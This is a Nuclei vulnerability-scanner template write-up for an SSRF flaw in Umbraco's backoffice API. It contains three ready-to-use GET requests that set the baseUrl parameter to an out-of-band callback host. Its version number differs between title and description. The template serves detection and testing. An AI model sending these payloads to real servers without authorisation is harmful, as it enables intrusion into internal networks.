# Nuclei Template: Umbraco 8.14.1 - baseUrl Server-Side Request Forgery (SSRF)
**Template ID:** umbraco-base-ssrf
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** Medium
**CWE:** CWE-918
**Source:** Nuclei Template (`umbraco-base-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
Umbraco 8.1.4.1 allows attackers to use the baseUrl parameter to several programs to perform a server-side request forgery (SSRF) attack.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/umbraco/BackOffice/Api/Help/GetContextHelpForPage?section=content&tree=undefined&baseUrl=http://{{interactsh-url}}
GET {{BaseURL}}/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardContent?section=TryToAvoidGetCacheItem111&baseUrl=http://{{interactsh-url}}/
GET {{BaseURL}}/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardCss?section=AvoidGetCacheItem&baseUrl=http://{{interactsh-url}}/
```

## References
- https://www.exploit-db.com/exploits/50462
